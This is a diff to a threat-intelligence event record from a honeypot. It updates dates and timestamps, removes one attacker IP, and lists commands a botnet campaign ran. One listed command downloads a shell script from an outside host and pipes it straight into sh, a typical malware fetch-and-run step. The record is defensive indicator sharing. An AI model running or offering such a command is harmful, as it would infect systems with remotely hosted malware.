@@ -1,8 +1,8 @@
 {
   "Event": {
     "uuid": "f54278c1-0f63-53d6-b601-d09877ff3092",
-    "info": "Sundew honeypot - campaign 0fc93cb64712 (3 sources) - sh",
-    "date": "2026-09-06",
+    "info": "Sundew honeypot - campaign 0fc93cb64712 (2 sources) - sh",
+    "date": "2026-09-09",
     "analysis": "2",
     "threat_level_id": "3",
     "published": true,
@@ -28,17 +28,8 @@
         "category": "Network activity",
         "to_ids": true,
         "value": "151.64.234.63",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "delivered_payload, confidence high; 1 sessions, 9 commands, 1 downloads; first_seen 2026-09-03T00:59:05.691678Z, last_seen 2026-09-03T01:02:06.389489Z; expires 7d after last_seen"
-      },
-      {
-        "uuid": "59e2a14c-3170-5b48-8e9b-3e29cab9e905",
-        "type": "ip-src",
-        "category": "Network activity",
-        "to_ids": true,
-        "value": "151.67.211.161",
-        "timestamp": "1788703212",
-        "comment": "delivered_payload, confidence high; 1 sessions, 9 commands, 1 downloads; first_seen 2026-09-02T18:22:02.129136Z, last_seen 2026-09-02T18:25:03.080090Z; expires 7d after last_seen"
       },
       {
         "uuid": "296928c0-85ca-5dd4-b79b-50e3f40049db",
@@ -46,7 +37,7 @@
         "category": "Network activity",
         "to_ids": true,
         "value": "31.190.249.49",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "delivered_payload, confidence high; 1 sessions, 9 commands, 1 downloads; first_seen 2026-09-06T09:29:12.627548Z, last_seen 2026-09-06T09:32:13.420221Z; expires 7d after last_seen"
       },
       {
@@ -55,7 +46,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "sh",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -64,7 +55,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "shell",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -73,7 +64,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "enable",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -82,7 +73,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "system",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -91,7 +82,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "ping; sh",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -100,7 +91,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox STC",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -109,7 +100,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox hostname TOASTER",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -118,7 +109,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox wget; /bin/busybox STC",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       },
       {
@@ -127,7 +118,7 @@
         "category": "Artifacts dropped",
         "to_ids": false,
         "value": "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;",
-        "timestamp": "1788703212",
+        "timestamp": "1788978615",
         "comment": "command run by this campaign"
       }
     ]
